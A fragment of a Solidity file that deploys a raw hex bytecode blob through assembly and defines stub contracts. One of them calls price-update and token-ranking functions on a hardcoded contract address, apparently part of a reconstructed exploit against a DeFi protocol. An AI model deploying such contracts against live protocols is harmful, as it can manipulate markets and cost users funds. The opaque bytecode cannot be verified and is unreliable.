            hex"5b90039392505050565b6000600019821415612d3d57612d3d612d64565b5060",
            hex"010190565b600060ff821660ff811415612d5b57612d5b612d64565b60010192",
            hex"915050565b634e487b7160e01b600052601160045260246000fd5b634e487b71",
            hex"60e01b600052601260045260246000fd5b634e487b7160e01b60005260416004",
            hex"5260246000fd5b6001600160a01b0381168114612dbb57600080fd5b50565b6d",
            hex"ffffffffffffffffffffffffffff81168114612dbb57600080fdfea264697066",
            hex"73582212208e956a517aad641b51f3a0259885876516e7ac24cf768a3a0b964a",
            hex"fc17fabc7364736f6c63430008040033"
        );
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract Xb634 {
    address immutable r = address(this);
    receive() external payable {}

    constructor() payable {}

    fallback() external payable {
        revert("no such function");
    }
}

contract Xfbc2 {
    address immutable r = address(this);
    receive() external payable {}

    constructor() payable {}

    fallback() external payable {
        revert("no such function");
    }
}

contract X7b91 {
    address immutable r = address(this);
    receive() external payable {}
    address constant xf00a = 0xF00A38376C8668fC1f3Cd3dAeef42E0E44A7Fcdb;

    constructor() payable {
        I(xf00a).updateCategoryPrices(1);
        I(xf00a).updateCategoryPrices(2);
    }

    function lockIn() public {
        I(xf00a).orderCategoryTokensByMarketCap(2);
        I(xf00a).getTopCategoryTokens(2, 5);
    }

    fallback() external payable {
        revert("no such function");
    }
}
